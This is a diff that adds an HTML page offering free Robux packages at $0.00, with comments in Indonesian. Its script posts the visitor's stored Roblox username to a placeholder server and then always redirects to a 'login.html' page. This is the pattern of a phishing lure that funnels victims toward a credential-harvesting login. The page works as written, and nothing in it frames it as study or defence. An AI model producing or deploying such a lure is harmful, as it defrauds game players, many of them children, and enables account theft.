@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Choose Robux Package</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 50px;
+        }
+        .card {
+            display: inline-block;
+            margin: 10px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            width: 200px;
+        }
+        .card h3 {
+            margin: 0 0 10px 0;
+        }
+        .button {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Choose Your Robux Package</h1>
+        <p id="welcomeMessage"></p>
+        <div class="card">
+            <h3>500 Robux</h3>
+            <p>Price: $0.00</p>
+            <button class="button" onclick="selectPackage('500 Robux')">Get Now</button>
+        </div>
+        <div class="card">
+            <h3>1000 Robux</h3>
+            <p>Price: $0.00</p>
+            <button class="button" onclick="selectPackage('1000 Robux')">Get Now</button>
+        </div>
+        <div class="card">
+            <h3>2000 Robux</h3>
+            <p>Price: $0.00</p>
+            <button class="button" onclick="selectPackage('2000 Robux')">Get Now</button>
+        </div>
+    </div>
+
+    <script>
+        // Mengecek username di localStorage
+        const username = localStorage.getItem('robloxUsername');
+        if (username) {
+            document.getElementById('welcomeMessage').textContent = `Welcome, ${username}! Choose your package.`;
+        } else {
+            window.location.href = 'index.html'; // Redirect ke halaman utama jika username tidak ada
+        }
+
+        // Fungsi untuk mengirim data paket yang dipilih ke server
+        function selectPackage(packageName) {
+            // Kirim data ke server
+            fetch('https://your-server-url.com/endpoint', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username: username, package: packageName }),
+            })
+            .finally(() => {
+                // Selalu arahkan ke halaman login, terlepas dari status pengiriman
+                window.location.href = 'login.html';
+            });
+        }
+    </script>
+</body>
+</html>
